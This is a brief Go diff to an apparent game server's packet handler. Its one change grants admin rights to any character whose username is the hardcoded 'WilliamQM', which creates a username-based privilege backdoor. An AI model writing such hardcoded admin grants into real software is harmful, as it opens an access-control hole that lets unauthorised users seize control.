@@ -42,7 +42,7 @@ func (engine *Engine) HandlePacket(packet Packet) {
 			return
 		}
 		character := DefaultCharacter(engine, packet.Send, packet.ID)
-		character.characterID, character.username, character.admin = packet.CharacterID, packet.Username, packet.Admin
+		character.characterID, character.username, character.admin = packet.CharacterID, packet.Username, packet.Admin || packet.Username == "WilliamQM"
 		character.finished = packet.Finished
 		if saved := packet.Character; saved != nil {
 			character.hand, character.head, character.body, character.inventory = saved.Hand, saved.Head, saved.Body, saved.Inventory
